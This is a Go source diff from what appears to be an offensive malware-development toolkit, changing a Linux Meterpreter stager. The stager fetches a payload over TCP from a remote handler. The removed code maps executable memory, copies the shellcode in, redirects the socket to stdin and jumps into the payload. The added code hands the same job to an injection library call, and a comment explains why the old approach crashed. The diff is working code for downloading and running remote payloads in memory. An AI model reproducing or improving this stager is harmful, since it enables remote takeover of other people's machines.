@@ -16,9 +16,9 @@ import (
 	"net"
 	"os"
 	"runtime"
-	"syscall"
 	"time"
-	"unsafe"
+
+	"github.com/oioio-space/maldev/injection"
 )
 
 // keepAliveFiles prevents garbage collection of socket file descriptors.
@@ -49,7 +49,11 @@ func (s *Stager) stageLinux() error {
 		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
 	}
 
-	return executeInMemoryWithSocket(shellcode, sockfd)
+	// Use injection.InjectMeterpreterWrapper which uses purego.SyscallN
+	// for proper System V AMD64 ABI calling convention. The raw
+	// unsafe.Pointer function-pointer cast does not set up registers
+	// correctly on Linux and crashes.
+	return injection.InjectMeterpreterWrapper(sockfd, shellcode)
 }
 
 // fetchStageLinux retrieves the stage and returns the socket fd.
@@ -111,42 +115,4 @@ func (s *Stager) fetchStageTCPLinux() ([]byte, int, error) {
 	keepAliveFiles = append(keepAliveFiles, file)
 
 	return stage, sockfd, nil
-}
-
-// executeInMemoryWithSocket allocates RWX memory via mmap, copies the wrapper
-// shellcode, duplicates the socket to stdin, and executes the wrapper.
-func executeInMemoryWithSocket(stage []byte, sockfd int) error {
-	page := syscall.Getpagesize()
-	size := (len(stage) + page - 1) / page * page
-
-	mem, err := syscall.Mmap(-1, 0, size,
-		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
-		syscall.MAP_PRIVATE|syscall.MAP_ANON)
-	if err != nil {
-		return fmt.Errorf("mmap: %v", err)
-	}
-
-	copy(mem, stage)
-
-	// Duplicate socket to stdin (fd 0) so the wrapper can read from it.
-	if _, _, errno := syscall.Syscall(syscall.SYS_DUP2, uintptr(sockfd), 0, 0); errno != 0 {
-		return fmt.Errorf("dup2: %v", errno)
-	}
-
-	shellcodeAddr := uintptr(unsafe.Pointer(&mem[0]))
-
-	// Execute in a locked OS thread.
-	go func() {
-		runtime.LockOSThread()
-		defer runtime.UnlockOSThread()
-
-		funcPtr := *(*func())(unsafe.Pointer(&shellcodeAddr))
-		funcPtr()
-	}()
-
-	runtime.Gosched()
-	runtime.Gosched()
-
-	// Block forever -- parent must stay alive for Meterpreter.
-	select {}
 }
